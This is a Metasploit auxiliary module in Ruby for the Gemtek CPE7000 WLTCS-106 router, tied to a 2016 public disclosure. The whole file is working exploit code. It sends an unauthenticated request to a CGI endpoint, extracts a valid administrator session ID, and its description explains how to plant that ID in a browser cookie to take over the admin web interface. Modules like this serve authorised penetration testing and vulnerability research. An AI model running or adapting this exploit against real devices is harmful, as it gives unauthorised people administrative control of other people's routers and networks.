##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Gemtek CPE7000 - WLTCS-106 Administrator SID Retriever',
      'Description'    => %q{
          A vulnerability exists for Gemtek CPE7000 model ID WLTCS-106 which allows
        unauthenticated remote attackers to retrieve a valid Administrative SID.

        To obtain an administrative web session inject this SID in your client's
        cookie with values as follow: userlevel=2;sid=<SID>

        Tested on Hardware version V02A and Firmware version 01.01.02.082.
      },
      'References'     =>
        [
          [ 'EDB', '39716' ],
          [ 'URL', 'http://www.mentat.is/docs/cpe7000-multiple-vulns.html' ],
          [ 'URL' , 'http://www.gemtek.com.tw/' ]
        ],
      'Author'         =>
        [
          'Federico Scalco <fscalco [ at] mentat.is>'
          #Based on the exploit by Federico Ramondino <framondino [at ] mentat.is>
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Apr 07 2016",
      'DefaultOptions' =>
      {
        'RPORT' => 443
      }
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The base URI to target application', '/']),
        OptBool.new('SSL', [true, 'Use SSL', true])
      ], self.class)
  end

  def run
    @peer = "#{rhost}:#{rport}"

    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => '/cgi-bin/sysconf.cgi',
      'vars_get' => {
        'page' => 'ajax.asp',
        'action' => 'login_confirm'
      }
    })

    if !res or res.code != 200
      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way")
    end

    ssid = res.body.split(',', 2)
    print_good("#{@peer} - Valid root SID retrieved: #{ssid[1]}")
  end
end